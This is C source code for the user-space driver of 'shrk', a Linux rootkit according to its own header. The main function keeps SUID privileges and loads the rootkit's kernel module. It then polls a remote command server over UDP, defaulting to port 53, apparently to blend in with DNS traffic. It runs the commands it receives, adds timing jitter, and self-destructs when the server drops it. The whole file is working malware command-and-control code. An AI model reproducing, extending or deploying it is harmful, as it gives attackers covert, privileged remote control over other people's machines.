#define _GNU_SOURCE

#include "inc/client.h"
#include "inc/cmds.h"
#include "inc/job.h"
#include "inc/kernel.h"
#include "inc/save.h"
#include "inc/util.h"

#include <stdbool.h>
#include <strings.h>

#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

// clang-format off

/*

 * shrk/user | user binary/driver for the shrk rootkit
 * written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

// clang-format on

bool   should_jitter = true;
job_t *job           = NULL;

void cleanup() {
  // we are done, free/cleanup stuff
  save_close();
  job_free(job);

  // we can remove the kernel module if we are in debug mode
  if (SHRK_DEBUG)
    kernel_unload();
}

void handler(int sig) {
  // interrupt can be ignored if we are not running in debug mode
  if (!SHRK_DEBUG && SIGINT == sig)
    return;

  debug("got a signal (%d), quitting", sig);
  cleanup();
  exit(1);
}

int main() {
  signal(SIGINT, handler);
  signal(SIGILL, handler);
  signal(SIGSEGV, handler);

  uid_t uid = geteuid();
  gid_t gid = getegid();

  client_t _client, *client = &_client;
  job_t    _job;

  job = &_job;

  debug("UID %d => %d", getuid(), uid);
  debug("GID %d => %d", getgid(), gid);

  // don't drop privileges when loaded with SUID
  if (setuid(uid) != 0 || setgid(gid) != 0)
    debug_err("failed to preserve privileges");

  // make sure the save file exists
  if (!save_creat()) {
    debug_err("failed to create the save file");
    return EXIT_FAILURE;
  }

  // load the kernel module
  if (!kernel_load())
    return EXIT_FAILURE;

  // initializtion
  randseed();
  job_new(job, client);

  // setup the UDP client connection (also does address resolving)
  if (client_setup(client, SHRK_SERVER_ADDR, SHRK_SERVER_PORT == 0 ? 53 : SHRK_SERVER_PORT) < 0) {
    debug_err("failed to create a connection");
    return EXIT_FAILURE;
  }

  // ask for jobs and handle them
  while (true) {
    switch (job_recv(job, true)) {
    // server returned the rest of the data for an older job
    case JOB_RECV_OK:
      debug("received packet for an older job, requesting again immediately");
      continue;

    // server returned no jobs, we have nothing to do
    case JOB_RECV_NONE:
      debug("no available jobs, requesting again");
      goto next;

    // failed to connect to the server or failed to receive any valid packets
    case JOB_RECV_FAIL:
      debug("failed to get a job, requesting again");
      goto next;

    /*

     * server rejected our request, most likely we are no longer a valid client
     * AKA the server removed us from the client list

     * so lets do the only reasonable thing: commit violent suicide

    */
    case JOB_RECV_INVALID:
      debug("job request rejected, self destructing");
      self_destruct();
      goto out;
    }

    debug("got a new job (id: %s, command: 0x%02x)", job->id, job->cmd);
    cmd_handle(job);

  next:
    if (should_jitter)
      jitter();
    else
      should_jitter = true;
  }

out:
  cleanup();
  return EXIT_SUCCESS;
}
